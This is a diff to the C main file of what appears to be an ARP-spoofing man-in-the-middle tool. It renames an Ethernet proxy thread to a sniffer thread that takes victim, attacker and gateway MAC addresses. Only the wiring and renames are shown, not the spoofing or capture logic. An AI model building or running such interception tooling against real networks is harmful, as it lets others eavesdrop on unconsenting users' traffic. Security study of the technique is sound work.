@@ -5,13 +5,13 @@
 int ARP_SOCK = -1;
 int ETH_SOCK = -1;
 pthread_t ARP_SPOOF_TID = -1;
-pthread_t ETH_PROXY_TID = -1;
+pthread_t ETH_SNIFFER_TID = -1;
 ARPSpoofArgs ARP_SPOOF_ARGS = {0};
-ETHProxyArgs ETH_PROXY_ARGS = {0};
+ETHSnifferArgs ETH_SNIFFER_ARGS = {0};
 
 void sigint_handler(int sig) {
     ARP_SPOOF_ARGS.is_terminated = 1;
-    ETH_PROXY_ARGS.is_terminated = 1;
+    ETH_SNIFFER_ARGS.is_terminated = 1;
 }
 
 void main(void) {
@@ -92,24 +92,27 @@ void main(void) {
 
     ETH_SOCK = get_eth_socket(if_name);
 
-    ETH_PROXY_ARGS.eth_sock = ETH_SOCK;
-    ETH_PROXY_ARGS.victim_mac = victim_mac;
-    ETH_PROXY_ARGS.attacker_mac = attacker_mac;
-    ETH_PROXY_ARGS.gateway_mac = gateway_mac;
-    ETH_PROXY_ARGS.is_terminated = 0;
+    ETH_SNIFFER_ARGS.eth_sock = ETH_SOCK;
+    ETH_SNIFFER_ARGS.victim_mac = victim_mac;
+    ETH_SNIFFER_ARGS.attacker_mac = attacker_mac;
+    ETH_SNIFFER_ARGS.gateway_mac = gateway_mac;
+    ETH_SNIFFER_ARGS.is_terminated = 0;
 
     if (pthread_create(
-            &ETH_PROXY_TID, NULL, start_eth_proxy, (void*)&ETH_PROXY_ARGS
+            &ETH_SNIFFER_TID,
+            NULL,
+            start_eth_sniffer,
+            (void*)&ETH_SNIFFER_ARGS
         )
         != 0) {
         fprintf(
-            stderr, "ERROR: Failed to create start_eth_proxy thread\n"
+            stderr, "ERROR: Failed to create start_eth_sniffer thread\n"
         );
         exit(1);
     }
 
     pthread_join(ARP_SPOOF_TID, NULL);
-    pthread_join(ETH_PROXY_TID, NULL);
+    pthread_join(ETH_SNIFFER_TID, NULL);
     close(ARP_SOCK);
     close(ETH_SOCK);
     exit(0);
